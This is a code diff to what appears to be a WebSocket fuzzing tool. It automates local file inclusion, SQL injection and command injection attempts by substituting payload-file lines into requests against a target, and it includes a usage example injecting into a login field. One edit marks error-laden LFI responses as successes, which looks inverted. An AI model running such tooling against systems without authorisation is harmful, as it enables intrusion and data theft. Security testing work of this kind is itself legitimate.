@@ -10,6 +10,7 @@ GREEN = Fore.GREEN
 RED = Fore.RED
 RESET = Fore.RESET
 
+ERROR_LIST = ["invalid", "could not", "can't", "cannot", "error", "incorrect"]
 
 
 # retrieves command line arguments entered
@@ -79,32 +80,35 @@ def lfi(target, payload, exampleRequest, encode):
         line = line.replace('\n', '')
         newRequest = exampleRequest.replace('*', line)
         response = w.InteractWithWsSite(target, newRequest)
-        if response != '' and response != ' ':
+        if (response != '' and response != ' ') or any([x in response.casefold() for x in ERROR_LIST]):
             print(f"{GREEN}[+]{RESET} Local file inclusion successful!")
-            print("response: %s\n" % response)
+            print(f"{GREEN}[+]{RESET} Payload: %s" % line)
+            print(f"{GREEN}[+]{RESET} Response: %s\n" % response)
         else:
-            print(f"{RED}[-]{RESET} Local file inclusion failed!\n")
+            print(f"{RED}[-]{RESET} Local file inclusion failed!")
+            print(f"{RED}[-]{RESET} Payload: %s\n" % line)
 
 
 
 # conduct sql injection attack
 def sqli(target, payload, exampleRequest, encode):
-    error_list = ["invalid", "could not", "can't get data", "error", "incorrect"]
+    
     print(f"{GREEN}[+]{RESET} sqli selected! Commencing SQLi attack...")
     print(f"{GREEN}[+]{RESET} {encode} encoding scheme detected!")
     with open (payload, 'r') as payload_file:
         payloads = payload_file.readlines()
     for line in payloads:
         line = line.replace('\n', '')
-        print("payload: %s" % line)
         newRequest = exampleRequest.replace('*', encoding(encode, line))
         response = w.InteractWithWsSite(target, newRequest)
         # chk_match = [x for x in error_list if x in response.casefold()]
-        if any([x in response.casefold() for x in error_list]) or response == ' ':
-            print(f"{RED}[-]{RESET} SQL injection failed!\n")
+        if any([x in response.casefold() for x in ERROR_LIST]) or response == ' ':
+            print(f"{RED}[-]{RESET} SQL injection failed!")
+            print(f"{RED}[-]{RESET} Payload: %s\n" % line)
         else:
             print(f"{GREEN}[+]{RESET} SQL injection successful!")
-            print("response: %s\n" % response)
+            print(f"{GREEN}[+]{RESET} Payload: %s" % line)
+            print(f"{GREEN}[+]{RESET} Response: %s\n" % response)
 # usage
 # python wsfuzz.py sqli -r '{"auth_user":"*","auth_pass":""}' -p payloads/custom_sqli.txt -e base64    
 
@@ -119,7 +123,7 @@ def cmdi(target, payload, exampleRequest, encode):
         line = line.replace('\n', '')
         newRequest = exampleRequest.replace('*', line)
         response = w.InteractWithWsSite(target, newRequest)
-        if 'neewashere' in response:
+        if 'wsfuzz' in response:
             print(f"{GREEN}[+]{RESET} Command injection successful!")
             print(f"{GREEN}[+]{RESET} Command output: {response}")
             print(f"{GREEN}[+]{RESET} Command: {line}")
